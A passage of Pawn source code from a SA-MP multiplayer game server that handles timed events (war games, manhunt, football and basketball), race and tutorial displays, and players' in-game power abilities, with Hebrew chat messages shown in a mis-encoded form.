				if(IsPlayerUsingSGuard_(i)) SetPlayerGravity(i,0.008000); // guard_shit
				TakeSpecialComponent(i);
				if(IsPlayerInAnyVehicle(i))
				{
					RemovePlayerFromVehicle(i);
					SetVehicleToRespawn(GetPlayerVehicleID(i));
				}
				TeleportToWarArea(i,warGames[wargameinfo[4]][wgPositions]);
				for(new ii=0;ii<MAX_PLAYERS_;ii++)
				{
					if(IsPlayerConnected(ii))
					{
						ShowPlayerNameTagForPlayer(ii,i,1);
						SetPlayerMarkerForPlayer(ii,i,GetColor(i,85));
					}
				}
				playerinfo[i][invisible] = 0;
				if(playerinfo[i][pet][0]) command(i,"/pet off");
				SetPlayerTeam(i,NO_TEAM);
				SetPlayerHealth(i,100.0);
				SetPlayerArmour(i,100.0);
				ResetWeapons(i);
				for(new j = 0; j < 10; j++) if(warGames[wargameinfo[4]][wgWeapons][j] != -1) GiveWeapon(i,ChoosenWeapon(i,warGames[wargameinfo[4]][wgWeapons][j]),warGames[wargameinfo[4]][wgAmmo][j]);
				SetCameraBehindPlayer(i);
				SendClientMessage(i,orange,string);
				PlaySound(i,1083);
				playerinfo[i][inact] = 1;
			}
		}
	}
	if(wargameinfo[2] == 0)
	{
		for(new i=0;i<MAX_PLAYERS_;i++)
		{
			if(IsPlayerConnected(i) && playerinfo[i][waitwargame])
			{
				playerinfo[i][inwargame] = 1, playerinfo[i][waitwargame] = 0;
				SetFreeze(i,0);
			}
		}
		SendClientMessageToAll(0x6DC5F3FF,"Х Х Х Х Х [ " @c(lightblue) "ЇЄщьх· рхшхюшщ·" @h(6DC5F3) " ] Х Х Х Х Х");
		format(string,sizeof(string)," ф·чщьф! юёЇ° фю∙··Їщэ: %d %s фЇЄщьх·",wargameinfo[1],warGames[wargameinfo[4]][wgName]);
		SendClientMessageToAll(red,string);
		SendClientMessageToAll(grey," /astats ьЎЇщщф с∙чўЁщ фЇЄщьх· Х /aquit - ьщЎщрф юфЇЄщьх·");
		SendClientMessageToAll(0x6DC5F3FF,"Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х");
		KillTimer(wargameinfo[3]);
	}
	#if lagtest
		LagTest_End("StartWarGame2");
	#endif
	if(debugstate) printf("Gamemode Activity [end]: StartWarGame2");
	return 1;
}
//=[StartManhunt]===============================================================
public StartManhunt(mtype)
{
	if(debugstate) printf("Gamemode Activity [start]: StartManhunt(%d)",mtype);
	#if lagtest
		LagTest_Start("StartManhunt");
	#endif
	new string[M_S];
	if(thereIsAct) return 0;
	manhuntinfo[0] = 1, manhuntinfo[1] = 0, manhuntinfo[2] = 60, manhuntinfo[3] = SetTimer("StartManhunt2",1000,1), manhuntinfo[4] = mtype == -1 ? random(sizeof(ManhuntTypes)) : mtype, manhuntinfo[6] = 0;
	SendClientMessageToAll(0x6DC5F3FF,"Х Х Х Х Х [ " @c(lightblue) "ЇЄщьх· рхшхюшщ·" @h(6DC5F3) " ] Х Х Х Х Х");
	format(string,sizeof(string)," !··чщь сЄху уўф " @c(green) "%s" @c(lightblue) " ЇЄщьх· фюЎху",ManhuntTypes[manhuntinfo[4]][mhName]);
	SendClientMessageToAll(lightblue,string);
	format(string,sizeof(string)," /join рх %s join ьфЎш°Їх· °∙хэ р· фЇўхуф",ManhuntTypes[manhuntinfo[4]][mhCommand]);
	SendClientMessageToAll(lightblue,string);
	SendClientMessageToAll(yellow," * .фЎш°Їх· ьЇЄщьх· Єхьф " #join_act "$ хфЇ°ё ьцхыф фхр " #actprize_manhunt);
	SendClientMessageToAll(0x6DC5F3FF,"Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х");
	format(string,sizeof(string),"~g~~h~%s~n~/join",ManhuntTypes[manhuntinfo[4]][mhName]);
	GameTextForAll(string,6000,1);
	thereIsAct = true;
	#if lagtest
		LagTest_End("StartManhunt");
	#endif
	if(debugstate) printf("Gamemode Activity [end]: StartManhunt(%d)",mtype);
	return 1;
}
//=[StartManhunt2]==============================================================
public StartManhunt2()
{
	if(debugstate) printf("Gamemode Activity [start]: StartManhunt2");
	#if lagtest
		LagTest_Start("StartManhunt2");
	#endif
	new string[M_S];
	manhuntinfo[2]--;
	if(manhuntinfo[2] > 0)
	{
		for(new i=0;i<sizeof(ActivitiesGameTextTimes);i++)
		{
			if(manhuntinfo[2] == ActivitiesGameTextTimes[i])
			{
				format(string,sizeof(string),"~g~~h~~h~%s: ~h~%d~n~~g~~h~~h~(%d/%d)",ManhuntTypes[manhuntinfo[4]][mhName],manhuntinfo[2],manhuntinfo[1],GetManhuntMaxPlayers());
				GameTextForAll(string,999,4);
				for(new ii=0;ii<MAX_PLAYERS_;ii++) if(IsPlayerConnected(ii) && !playerinfo[ii][modeafk]) PlaySound(ii,1056);
			}
		}
		if(manhuntinfo[2] == 10 || manhuntinfo[2] == 30)
		{
			format(string,sizeof(string)," /join :··чщь сЄху %d ∙Ёщх·, ьфЎш°Їх· %s фЇЄщьх·",manhuntinfo[2],ManhuntTypes[manhuntinfo[4]][mhName]);
			SendClientMessageToAll(brown,string);
		}
	}
	if(manhuntinfo[2] == 3)
	{
		if(manhuntinfo[1] < 2) return EndManhunt("юёЇ° ф∙чўЁщэ ∙фЎш°Їх ўшя ю2",-1);
		new player[MAX_PLAYERS], players = 0;
		for(new i=0;i<MAX_PLAYERS_;i++) if(IsPlayerConnected(i) && playerinfo[i][waitmanhunt]) player[players++] = i;
		manhuntinfo[5] = player[random(players)];
		format(string,sizeof(string)," %s" @c(orange) " :ф∙чўя фЁщЎху !%s сфЎьчф с",GetName(manhuntinfo[5]),ManhuntTypes[manhuntinfo[4]][mhName]);
		for(new i=0,id=0;i<MAX_PLAYERS_;i++)
		{
			if(IsPlayerConnected(i) && playerinfo[i][waitmanhunt])
			{
				SetFreeze(i,1);
				id = manhuntinfo[5] == i ? 0 : playerinfo[i][manhuntid];
				if(IsPlayerUsingSGuard_(i)) SetPlayerGravity(i,0.008000); // guard_shit
				TakeSpecialComponent(i);
				if(IsPlayerInAnyVehicle(i))
				{
					RemovePlayerFromVehicle(i);
					SetVehicleToRespawn(GetPlayerVehicleID(i));
				}
				ResetWeapons(i);
				if(manhuntinfo[5] == i)
				{
					SetPlayerHealth(i,ManhuntTypes[manhuntinfo[4]][mhHHealth]);
					SetPlayerArmour(i,ManhuntTypes[manhuntinfo[4]][mhHArmour]);
					if(ManhuntTypes[manhuntinfo[4]][mhHSkin] != -1) SetPlayerSkin(i,ManhuntTypes[manhuntinfo[4]][mhHSkin]);
					SetPlayerColor(i,ManhuntTypes[manhuntinfo[4]][mhHColor]);
					for(new j = 0; j < 5; j++) if(ManhuntTypes[manhuntinfo[4]][mhHWeapons][j] != -1) GiveWeapon(i,ManhuntTypes[manhuntinfo[4]][mhHWeapons][j],ManhuntTypes[manhuntinfo[4]][mhHAmmo][j]);
				}
				else
				{
					SetPlayerHealth(i,ManhuntTypes[manhuntinfo[4]][mhMHealth]);
					SetPlayerArmour(i,ManhuntTypes[manhuntinfo[4]][mhMArmour]);
					if(ManhuntTypes[manhuntinfo[4]][mhMSkin] != -1) SetPlayerSkin(i,ManhuntTypes[manhuntinfo[4]][mhMSkin]);
					SetPlayerColor(i,ManhuntTypes[manhuntinfo[4]][mhMColor]);
					for(new j = 0; j < 5; j++) if(ManhuntTypes[manhuntinfo[4]][mhMWeapons][j] != -1) GiveWeapon(i,ManhuntTypes[manhuntinfo[4]][mhMWeapons][j],ManhuntTypes[manhuntinfo[4]][mhMAmmo][j]);
				}
				if(manhuntinfo[4] == 0)
				{
					SetPlayerPos(i,ManhuntCommandoPositions[id][0],ManhuntCommandoPositions[id][1],ManhuntCommandoPositions[id][2]);
					SetPlayerFacingAngle(i,ManhuntCommandoPositions[id][3]);
				}
				else if(manhuntinfo[4] == 1) SetPlayerPos(i,LVManhuntPositions[id][0],LVManhuntPositions[id][1],LVManhuntPositions[id][2]);
				SetPlayerInterior(i,0);
				SetPlayerVirtualWorld(i,world_manhunt);
				for(new ii=0;ii<MAX_PLAYERS_;ii++)
				{
					if(IsPlayerConnected(ii))
					{
						ShowPlayerNameTagForPlayer(ii,i,1);
						SetPlayerMarkerForPlayer(ii,i,GetColor(i,85));
					}
				}
				playerinfo[i][invisible] = 0;
				if(playerinfo[i][pet][0]) command(i,"/pet off");
				SetCameraBehindPlayer(i);
				SendClientMessage(i,yellow,string);
				SendClientMessage(i,orange," !сЄху 200 ∙Ёщх· фЇЄщьх· ·ё·щщэ, рэ фЁщЎху щ∙р° чщщ фхр щЁЎч, рч°· ф∙р° щЁЎчх");
				playerinfo[i][inact] = 1;
			}
		}
	}
	if(manhuntinfo[2] == 0)
	{
		for(new i=0;i<MAX_PLAYERS_;i++)
		{
			if(IsPlayerConnected(i) && playerinfo[i][waitmanhunt])
			{
				playerinfo[i][inmanhunt] = 1, playerinfo[i][waitmanhunt] = 0;
				SetFreeze(i,0);
				TeamDefines(i);
			}
		}
		SendClientMessageToAll(0x6DC5F3FF,"Х Х Х Х Х [ " @c(lightblue) "ЇЄщьх· рхшхюшщ·" @h(6DC5F3) " ] Х Х Х Х Х");
		format(string,sizeof(string)," ф·чщьф! юёЇ° фю∙··Їщэ: %d %s ЇЄщьх· фюЎху",manhuntinfo[1],ManhuntTypes[manhuntinfo[4]][mhName]);
		SendClientMessageToAll(lightblue,string);
		SendClientMessageToAll(grey," /astats ьЎЇщщф с∙чўЁщ фЇЄщьх· Х /aquit - ьщЎщрф юфЇЄщьх·");
		SendClientMessageToAll(0x6DC5F3FF,"Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х");
		KillTimer(manhuntinfo[3]);
		manhuntinfo[6] = 200;
	}
	#if lagtest
		LagTest_End("StartManhunt2");
	#endif
	if(debugstate) printf("Gamemode Activity [end]: StartManhunt2");
	return 1;
}
//=[RaceTextDraw]===============================================================
public RaceTextDraw(playerid,act[])
{
	#if lagtest
		LagTest_Start("RaceTextDraw");
	#endif
	if(act[0] == 'c')
	{
		playerinfo[playerid][racetd] = TextDrawCreate(536.000000,314.000000,"CP: 00/00~n~00:00:00");
		TextDrawAlignment(playerinfo[playerid][racetd],2);
		TextDrawBackgroundColor(playerinfo[playerid][racetd],255);
		TextDrawFont(playerinfo[playerid][racetd],3);
		TextDrawLetterSize(playerinfo[playerid][racetd],0.929999,2.699999);
		TextDrawColor(playerinfo[playerid][racetd],10092363);
		TextDrawSetOutline(playerinfo[playerid][racetd],0);
		TextDrawSetProportional(playerinfo[playerid][racetd],1);
		TextDrawSetShadow(playerinfo[playerid][racetd],0);
		TextDrawShowForPlayer(playerid,playerinfo[playerid][racetd]);
	}
	else if(act[0] == 'd')
	{
		TextDrawHideForPlayer(playerid,playerinfo[playerid][racetd]);
		TextDrawDestroy(playerinfo[playerid][racetd]);
	}
	else if(act[0] == 'u')
	{
		new string[64];
		format(string,sizeof(string),"CP: %02d/%02d~n~%02d:%02d:%02d",playerinfo[playerid][racecp]-raceinfo[8],playerinfo[playerid][racemaxcp],playerinfo[playerid][racerecord][2],playerinfo[playerid][racerecord][1],playerinfo[playerid][racerecord][0]);
		TextDrawSetString(playerinfo[playerid][racetd],string);
	}
	#if lagtest
		LagTest_End("RaceTextDraw");
	#endif
	return 1;
}
//=[EndAchievement]=============================================================
public EndAchievement(playerid,notime)
{
	if(notime) KillTimer(playerinfo[playerid][ach][2]);
	playerinfo[playerid][ach] = {-1,0,-1};
	return 1;
}
//=[ExplodeByTimer]=============================================================
public ExplodeByTimer(Float:x,Float:y,Float:z,expid,shake,vw) return CreateExplosionVW(x,y,z,expid,shake ? 0.3 : 0.1,vw);
//=[DestroyObjectByTimer]=======================================================
public DestroyObjectByTimer(objectid) return DestroySObject(objectid);
//=[GoTutorial]=================================================================
public GoTutorial(playerid)
{
	SendTutorialMessage(playerid,white,"TESTTUT1");
	assert playerinfo[playerid][tut][0] > -1;
	SendTutorialMessage(playerid,white,"TESTTUT2");
	#if lagtest
		LagTest_Start("GoTutorial");
	#endif
	SendTutorialMessage(playerid,white,"TESTTUT3");
	new string[M_S], lines = 2;
	new const T = playerinfo[playerid][tut][0], P = tutorialinfo[playerinfo[playerid][tut][0]][tutPartsArrayPos] + playerinfo[playerid][tut][1];
	#define t_Clear(%1) for(new i = 0, mx = (%1); i < mx; i++) SendTutorialMessage(playerid,white," ")
	t_Clear(!playerinfo[playerid][tut][1] ? 120 : (10 - (lines += (tutorialinfo[T][tutParts]+2))));
	SendTutorialMessage(playerid,white,"TESTTUT4");
	SendTutorialMessage(playerid,lightred," /TStop - ьфЇёў· фюу°щъ");
	format(string,sizeof(string),"юу°щъ: " @c(white) "%s" @c(lightred) " Х чьў: " @c(white) "%02d" @c(lightred) "/" @c(white) "%02d",tutorialinfo[T][tutName],playerinfo[playerid][tut][1],tutorialinfo[T][tutParts]);
	SendTutorialMessage(playerid,lightred,string);
	t_Clear(8-lines);
	format(string,sizeof(string)," ╗ %s",tutorialparts[P][tutpName]);
	SendTutorialMessage(playerid,lightblue,string);
	for(new i = 1; i <= tutorialparts[P][tutpLines]; i++) SendTutorialMessage(playerid,white,Tutorial_GetLine(T,playerinfo[playerid][tut][1],i));
	if(tutorialparts[P][tutpCamPos][0] != 0.0)
	{
		if(!playerinfo[playerid][tut][1])
		{
			SetPlayerCameraPos(playerid,tutorialparts[P][tutpCamPos][0],tutorialparts[P][tutpCamPos][1],tutorialparts[P][tutpCamPos][2]);
			SetPlayerCameraLookAt(playerid,tutorialparts[P][tutpCamLookAt][0],tutorialparts[P][tutpCamLookAt][1],tutorialparts[P][tutpCamLookAt][2]);
		}
		else
		{
			InterpolateCameraPos(playerid,tutorialparts[P-1][tutpCamPos][0],tutorialparts[P-1][tutpCamPos][1],tutorialparts[P-1][tutpCamPos][2],tutorialparts[P][tutpCamPos][0],tutorialparts[P][tutpCamPos][1],tutorialparts[P][tutpCamPos][2],5000,CAMERA_MOVE);
			InterpolateCameraLookAt(playerid,tutorialparts[P-1][tutpCamLookAt][0],tutorialparts[P-1][tutpCamLookAt][1],tutorialparts[P-1][tutpCamLookAt][2],tutorialparts[P][tutpCamLookAt][0],tutorialparts[P][tutpCamLookAt][1],tutorialparts[P][tutpCamLookAt][2],5000,CAMERA_MOVE);
		}
	}
	if(!playerinfo[playerid][tut][1]) PlayAudioStreamForPlayer(playerid,tutorialinfo[T][tutMusic]);
	playerinfo[playerid][tut][1]++;
	if(playerinfo[playerid][tut][1] < tutorialinfo[T][tutParts]) playerinfo[playerid][tut][2] = 4 * tutorialparts[P][tutpLines] + (!playerinfo[playerid][tut][1] ? 3 : 0);
	else
	{
		playerinfo[playerid][tut] = {-1,0,0}, playerinfo[playerid][nomsg] = 0;
		SetFreeze(playerid,0);
		SetCameraBehindPlayer(playerid);
	}
	PlaySound(playerid,1057);
	#undef t_Clear
	#if lagtest
		LagTest_End("GoTutorial");
	#endif
	return 1;
}
//=[StartSport]=================================================================
public StartSport(sporttype)
{
	if(debugstate) printf("Gamemode Activity [start]: StartSport(%d)",sporttype);
	new string[M_S], stname[16];
	if(thereIsAct) return 0;
	sportinfo[0] = 1, sportinfo[1] = 0, sportinfo[2] = 120, sportinfo[3] = SetTimer("StartSport2",1000,1), sportinfo[5] = sporttype, sportinfo[6] = -1, sportinfo[7] = -1;
	switch(sporttype)
	{
		case sport1_football: stname = "ыух°ть";
		case sport2_basketball: stname = "ыух°ёь";
	}
	SendClientMessageToAll(0x6DC5F3FF,"Х Х Х Х Х [ " @c(lightblue) "ЇЄщьх· рхшхюшщ·" @h(6DC5F3) " ] Х Х Х Х Х");
	format(string,sizeof(string)," !ЇЄщьх· ёЇх°ш юёхт " @c(yellow) "%s" @c(lightyellow) " ··чщь сЄху уўф",stname);
	SendClientMessageToAll(lightyellow,string);
	SendClientMessageToAll(lightyellow," /join рх /sport join ьфЎш°Їх· °∙юх р· фЇўхуф");
	SendClientMessageToAll(yellow," * /team create :ыущ ьфЎш°є чхсф ьфщх· сЄьщф ∙ь ўсхЎф Єэ юўёщюхэ 5 ∙чўЁщэ, ьщЎщ°· ўсхЎф");
	SendClientMessageToAll(yellow," * .фЎш°Їх· ьЇЄщьх· Єхьф " #join_act "$ хфЇ°ё ьўсхЎф фцхыф фхр " #actprize_sport);
	SendClientMessageToAll(0x6DC5F3FF,"Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х");
	GameTextForAll("~b~~h~~h~sport~n~/join",6000,1);
	thereIsAct = true;
	if(debugstate) printf("Gamemode Activity [end]: StartSport");
	return 1;
}
//=[StartSport2]================================================================
public StartSport2()
{
	if(debugstate) printf("Gamemode Activity [start]: StartSport2");
	new string[M_S];
	sportinfo[2]--;
	if(sportinfo[2] > 0)
	{
		for(new i=0;i<sizeof(ActivitiesGameTextTimes);i++)
		{
			if(sportinfo[2] == ActivitiesGameTextTimes[i])
			{
				format(string,sizeof(string),"~b~~h~~h~Sport: ~h~%d",sportinfo[2]);
				GameTextForAll(string,999,4);
				for(new ii=0;ii<MAX_PLAYERS_;ii++) if(IsPlayerConnected(ii) && !playerinfo[ii][modeafk]) PlaySound(ii,1056);
			}
		}
		if(sportinfo[2] == 15 || sportinfo[2] == 30 || sportinfo[2] == 60 || sportinfo[2] == 100)
		{
			format(string,sizeof(string)," /team create :ьщЎщ°· ўсхЎф | /join :ЇЄщьх· фёЇх°ш ··чщь сЄху %d ∙Ёщх·, ьфЎш°Їх·",sportinfo[2]);
			SendClientMessageToAll(brown,string);
		}
	}
	if(sportinfo[2] == 3)
	{
		if(sportinfo[1] < 2 || sportinfo[6] == -1 || sportinfo[7] == -1) return EndSport(" рщя юёЇщў ∙чўЁщэ",-1);
		for(new i=0;i<MAX_PLAYERS_;i++)
		{
			if(IsPlayerConnected(i) && playerinfo[i][waitsport])
			{
				SetFreeze(i,1);
				if(IsPlayerUsingSGuard_(i)) SetPlayerGravity(i,0.008000); // guard_shit
				TakeSpecialComponent(i);
				ResetWeapons(i);
				SetPlayerVirtualWorld(i,world_sport);
				SetPlayerInterior(i,0);
				for(new ii=0;ii<MAX_PLAYERS_;ii++)
				{
					if(IsPlayerConnected(ii))
					{
						ShowPlayerNameTagForPlayer(ii,i,1);
						SetPlayerMarkerForPlayer(ii,i,GetColor(i,85));
					}
				}
				playerinfo[i][invisible] = 0;
				if(playerinfo[i][pet][0]) command(i,"/pet off");
				SetCameraBehindPlayer(i);
				SetPlayerHealth(i,100.0);
				SetPlayerArmour(i,0.0);
				if(sportinfo[5] == sport1_football)
				{
					if(sportinfo[6] == playerinfo[i][team])
					{
						SetPlayerPos(i,Sport1Spawns[9-playerinfo[i][sportid]][0],Sport1Spawns[9-playerinfo[i][sportid]][1],Sport1Spawns[9-playerinfo[i][sportid]][2]);
						SetPlayerFacingAngle(i,Sport1Spawns[9-playerinfo[i][sportid]][3]);
					}
					else
					{
						SetPlayerPos(i,Sport1Spawns[playerinfo[i][sportid]][0],Sport1Spawns[playerinfo[i][sportid]][1],Sport1Spawns[playerinfo[i][sportid]][2]);
						SetPlayerFacingAngle(i,Sport1Spawns[playerinfo[i][sportid]][3]);
					}
				}
				if(sportinfo[5] == sport2_basketball)
				{
					if(sportinfo[6] == playerinfo[i][team])
					{
						SetPlayerPos(i,Sport2Spawns[9-playerinfo[i][sportid]][0],Sport2Spawns[9-playerinfo[i][sportid]][1],Sport2Spawns[9-playerinfo[i][sportid]][2]);
						SetPlayerFacingAngle(i,Sport2Spawns[9-playerinfo[i][sportid]][3]);
					}
					else
					{
						SetPlayerPos(i,Sport2Spawns[playerinfo[i][sportid]][0],Sport2Spawns[playerinfo[i][sportid]][1],Sport2Spawns[playerinfo[i][sportid]][2]);
						SetPlayerFacingAngle(i,Sport2Spawns[playerinfo[i][sportid]][3]);
					}
				}
				ResetWeapons(i);
				SendClientMessage(i,orange," !сфЎьчф сЇЄщьх· фёЇх°ш");
				playerinfo[i][inact] = 1;
			}
		}
	}
	if(sportinfo[2] == 0)
	{
		for(new i=0;i<MAX_PLAYERS_;i++)
		{
			if(IsPlayerConnected(i) && playerinfo[i][waitsport])
			{
				playerinfo[i][insport] = 1, playerinfo[i][waitsport] = 0;
				SetFreeze(i,0);
			}
		}
		SendClientMessageToAll(0x6DC5F3FF,"Х Х Х Х Х [ " @c(lightblue) "ЇЄщьх· рхшхюшщ·" @h(6DC5F3) " ] Х Х Х Х Х");
		format(string,sizeof(string)," ЇЄщьх· фёЇх°ш ф·чщьф! юёЇ° фю∙··Їщэ: %d",sportinfo[1]);
		SendClientMessageToAll(lightyellow,string);
		SendClientMessageToAll(grey," /astats ьЎЇщщф с∙чўЁщ фЇЄщьх· Х /aquit - ьщЎщрф юфЇЄщьх·");
		SendClientMessageToAll(0x6DC5F3FF,"Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х");
		KillTimer(sportinfo[3]);
		sportinfo[3] = SetTimer("WinSport",1000,1), sportinfo[4] = 180;
		ReleaseSportParam();
	}
	if(debugstate) printf("Gamemode Activity [end]: StartSport2");
	return 1;
}
//=[WinSport]===================================================================
public WinSport()
{
	if(debugstate) printf("Gamemode Activity [start]: WinSport");
	new string[M_S];
	sportinfo[4]--;
	if(!sportinfo[4])
	{
		new teamscores[2];
		for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && playerinfo[i][insport] && playerinfo[i][sportscore] > 0) teamscores[playerinfo[i][team] == sportinfo[6] ? 0 : 1] += playerinfo[i][sportscore];
		if(teamscores[0] == teamscores[1])
		{
			format(string,sizeof(string)," !рє ўсхЎф ьр ЁщЎчф ,%s & %s щ∙ ∙щххщхя сЇЄщьх· фёЇх°ш сщя фўсхЎх·",teaminfo[sportinfo[6]][teamname],teaminfo[sportinfo[7]][teamname]);
			SendClientMessageToAll(yellow,string);
			for(new i=0;i<MAX_PLAYERS_;i++) if(IsPlayerConnected(i) && playerinfo[i][insport])
			{
				SetPlayerInterior(i,0);
				SpawnPlayer(i);
				playerinfo[i][insport] = 0, playerinfo[i][waitsport] = 0, playerinfo[i][sportid] = -1, playerinfo[i][sportscore] = 0;
				playerinfo[i][inact] = 0;
			}
		}
		else
		{
			new winteam = teamscores[0] > teamscores[1] ? sportinfo[6] : sportinfo[7];
			format(string,sizeof(string)," !ЁщЎчф сЇЄщьх· фёЇх°ш %s фўсхЎф",teaminfo[winteam][teamname]);
			SendClientMessageToAll(yellow,string);
			for(new i=0;i<MAX_PLAYERS_;i++) if(IsPlayerConnected(i) && playerinfo[i][insport])
			{
				SetPlayerInterior(i,0);
				SpawnPlayer(i);
				if(playerinfo[i][team] == winteam)
				{
					act_SaveWin(i,act_Code(aid_sport,sportinfo[5]));
					GiveMoney(i,headserver != i ? actprize_sport : actprize_sport*2, 10);
				}
				playerinfo[i][insport] = 0, playerinfo[i][waitsport] = 0, playerinfo[i][sportid] = -1, playerinfo[i][sportscore] = 0;
				playerinfo[i][inact] = 0;
			}
		}
		DestroyObject(sportinfo[9]);
		sportinfo[0] = 0, sportinfo[1] = 0, sportinfo[2] = 0, sportinfo[4] = 0, sportinfo[5] = 0, sportinfo[6] = -1, sportinfo[7] = -1, sportinfo[8] = INVALID_PLAYER_ID, sportinfo[9] = -1;
		KillTimer(sportinfo[3]);
	}
	new sportScoreShow[] = {150,100,50}, bool:show = false;
	for(new t = 0; t < sizeof(sportScoreShow); t++) if(sportinfo[4] == sportScoreShow[t]) show = true;
	if(show)
	{
		SportUpdate(1);
		SportUpdate(3);
	}
	if(debugstate) printf("Gamemode Activity [end]: WinSport");
	return 1;
}
//=[TakeEnergyByTimer]==========================================================
public TakeEnergyByTimer(playerid,take)
{
	if(playerinfo[playerid][powerparam] != powerparam_energy) TakeEnergy(playerid,take);
	/*if(!playerinfo[playerid][energy])
	{
		SendClientMessage(playerid,red," !рщя ьъ Єху рЁ°тщф");
		StopUsingPower(playerid);
	}*/
	if(playerinfo[playerid][usepower])
	{
		SetTimerEx("TakeEnergyByTimer",1000,0,"ii",playerid,take);
		if(playerinfo[playerid][powerparam] > 0)
		{
			new Float:p[3];
			GetPlayerPos(playerid,p[0],p[1],p[2]);
			switch(playerinfo[playerid][powerparam])
			{
				case powerparam_firezone:
				{
					if(!random(3))
					{
						new Float:rnd1 = floatrand(7.0,12.0), Float:rnd2 = floatrand(7.0,12.0);
						if(!random(2)) rnd1 = 0-rnd1;
						if(!random(2)) rnd2 = 0-rnd2;
						AddFire(p[0] + rnd1,p[1] + rnd2,p[2]);
						CreateExplosionVW(p[0] + rnd1,p[1] + rnd2,p[2],4,0.1,world_normal);
					}
				}
				case powerparam_firestream:
				{
					new k[2], Float:dist = 12.0;
					GetPlayerKeys(playerid,k[0],k[1],k[1]);
					if(k[0] & 128) dist = 25.0;
					GetPlayerCameraLine(playerid,p[0],p[1],p[2],dist);
					CreateExplosionVW(p[0],p[1],p[2],4 + random(2),0.1,world_normal);
				}
				case powerparam_fountain:
				{
					new o;
					for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && IsPlayerInRangeOfPoint(i,12.5,playerinfo[playerid][waterpos][0],playerinfo[playerid][waterpos][1],playerinfo[playerid][waterpos][2]) && i != playerid)
					{
						GetPlayerPos(i,p[0],p[1],p[2]);
						o = CreateSObject(18720,p[0],p[1],p[2],0.0,0.0,0.0);
						MoveSObject(o,p[0],p[1],p[2]-2.0,2.0);
						objectinfo[o][odam] = 1;
						Damage(i,15.0,playerid);
					}
				}
				case powerparam_waterfall:
				{
					new o;
					for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && IsPlayerInRangeOfPoint(i,12.5,playerinfo[playerid][waterpos][0],playerinfo[playerid][waterpos][1],playerinfo[playerid][waterpos][2]) && i != playerid)
					{
						o = CreateSObject(7916,playerinfo[playerid][waterpos][0],playerinfo[playerid][waterpos][1],playerinfo[playerid][waterpos][2],0.0,0.0,0.0);
						GetPlayerPos(i,p[0],p[1],p[2]);
						SetObjectToFaceCords(o,p[0],p[1],p[2]);
						MoveSObject(o,p[0],p[1],p[2],4.0);
						objectinfo[o][odmg] = 30.0;
						objectinfo[o][odam] = 1;
					}
				}
				case powerparam_lcharge:
				{
					new o;
					for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && IsPlayerInRangeOfPoint(i,2.5,p[0],p[1],p[2]) && i != playerid)
					{
						o = CreateSObject(18681,p[0],p[1],p[2],0.0,0.0,0.0);
						MoveSObject(o,p[0],p[1],p[2]-1.0,0.2);
						objectinfo[o][odam] = 1;
						if(playerinfo[i][lredirection] > 0)
						{
							GetPlayerPos(i,p[0],p[1],p[2]);
							o = CreateSObject(18681,p[0],p[1],p[2],0.0,0.0,0.0);
							MoveSObject(o,p[0],p[1],p[2]-1.0,0.2);
							objectinfo[o][odam] = 1;
						}
						else Damage(i,5.0,playerid);
					}
				}
				case powerparam_lrelease:
				{
					for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && IsPlayerInRangeOfPoint(i,3.5,p[0],p[1],p[2]) && i != playerid && !playerinfo[i][lredirection])
					{
						GetPlayerPos(i,p[0],p[1],p[2]);
						CreateExplosionVW(p[0],p[1],p[2]+2.0,4,0.1,world_normal);
					}
				}
				case powerparam_energy:
				{
					if(playerinfo[playerid][energyrelease] != INVALID_PLAYER_ID)
					{
						if(GetDistanceBetweenPlayers(playerid,playerinfo[playerid][energyrelease]) <= 4.0)
						{
							TakeEnergy(playerid,2);
							AddEnergy(playerinfo[playerid][energyrelease],playerinfo[playerid][energy] == 1 ? 1 : 2);
							if(!playerinfo[playerid][energy]) StopUsingPower(playerid);
						}
						else
						{
							playerinfo[playerid][energyrelease] = INVALID_PLAYER_ID;
							StopUsingPower(playerid);
						}
					}
					else if(playerinfo[playerid][energypump] != INVALID_PLAYER_ID)
					{
						if(GetDistanceBetweenPlayers(playerid,playerinfo[playerid][energypump]) <= 4.0)
						{
							AddEnergy(playerid,playerinfo[playerinfo[playerid][energypump]][energy] == 1 ? 1 : 2);
							TakeEnergy(playerinfo[playerid][energypump],2);
							if(!playerinfo[playerinfo[playerid][energypump]][energy]) StopUsingPower(playerid);
						}
						else
						{
							playerinfo[playerid][energypump] = INVALID_PLAYER_ID;
							StopUsingPower(playerid);
						}
					}
					else if(playerinfo[playerid][energystraw] != INVALID_PLAYER_ID)
					{
						if(GetDistanceBetweenPlayers(playerid,playerinfo[playerid][energystraw]) <= 12.0)
						{
							AddEnergy(playerid,playerinfo[playerinfo[playerid][energystraw]][energy] < 4 ? playerinfo[playerinfo[playerid][energystraw]][energy] : 4);
							TakeEnergy(playerinfo[playerid][energystraw],4);
							if(!playerinfo[playerinfo[playerid][energystraw]][energy]) StopUsingPower(playerid);
						}
						else
						{
							playerinfo[playerid][energystraw] = INVALID_PLAYER_ID;
							StopUsingPower(playerid);
						}
					}
				}
				case powerparam_devilcurse:
				{
					new Float:val;
					GetPlayerHealth(playerid,val);
					SetPlayerHealth(playerinfo[playerid][cursed],val);
					GetPlayerArmour(playerid,val);
					SetPlayerArmour(playerinfo[playerid][cursed],val);
				}
			}
		}
	}
	return 1;
}
//=[SportShoot]=================================================================
public SportShoot(playerid,final)
{
	if(!playerinfo[playerid][sportparam]) return 1;
	if(sportinfo[8] == playerid)
	{
		new k[2];
		GetPlayerKeys(playerid,k[0],k[1],k[1]);
		playerinfo[playerid][sportparam] += (k[0] & KEY_FIRE ? 1 : 0);
	}
	else playerinfo[playerid][sportparam] = 0;
	if(final)
	{
		new Float:p[3], rnd = !random(2) ? 2 : 3;
		GetPlayerPos(playerid,p[0],p[1],p[2]);
		GetXYInFrontOfPlayer(playerid,p[0],p[1],0.5);
